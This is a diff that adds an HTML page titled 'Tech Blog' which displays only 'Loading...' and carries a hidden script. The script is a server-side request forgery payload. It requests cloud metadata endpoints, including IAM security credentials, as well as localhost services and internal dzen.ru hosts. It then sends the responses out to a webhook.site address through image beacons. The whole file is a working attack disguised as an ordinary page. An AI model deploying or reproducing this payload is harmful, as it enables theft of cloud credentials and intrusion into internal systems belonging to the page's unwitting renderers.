@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head><title>Tech Blog</title></head>
+<body>
+<p>Loading...</p>
+<script>
+var wh = "https://webhook.site/f34e1577-b464-45fc-a799-9d5f31086476";
+
+function exfil(label, data) {
+  var img = new Image();
+  img.src = wh + "/ssrf-" + label + "?d=" + encodeURIComponent(data.substring(0, 1500));
+}
+
+var targets = [
+  {label: "meta-yc", url: "http://169.254.169.254/computeMetadata/v1/?recursive=true", headers: {"Metadata-Flavor": "Google"}},
+  {label: "meta-aws", url: "http://169.254.169.254/latest/meta-data/", headers: {}},
+  {label: "meta-yc2", url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/", headers: {}},
+  {label: "localhost-80", url: "http://localhost/", headers: {}},
+  {label: "localhost-8080", url: "http://localhost:8080/", headers: {}},
+  {label: "localhost-9200", url: "http://localhost:9200/", headers: {}},
+  {label: "vh-admin", url: "http://vh-admin.dzen.ru/", headers: {}},
+  {label: "lkpo", url: "http://lkpo.dzen.ru/", headers: {}}
+];
+
+targets.forEach(function(t) {
+  fetch(t.url, {headers: t.headers, mode: "no-cors"})
+    .then(function(r) { return r.text().catch(function() { return "status:" + r.status; }); })
+    .then(function(body) { exfil(t.label, body); })
+    .catch(function(e) { exfil(t.label + "-err", e.message); });
+});
+
+setTimeout(function() {
+  targets.forEach(function(t) {
+    try {
+      var x = new XMLHttpRequest();
+      x.open("GET", t.url, true);
+      x.onload = function() { exfil("xhr-" + t.label, x.responseText.substring(0, 1500)); };
+      x.onerror = function() { exfil("xhr-" + t.label + "-err", "xhr-error-" + x.status); };
+      Object.keys(t.headers).forEach(function(k) { x.setRequestHeader(k, t.headers[k]); });
+      x.send();
+    } catch(e) { exfil("xhr-" + t.label + "-exc", e.message); }
+  });
+}, 2000);
+</script>
+</body>
+</html>
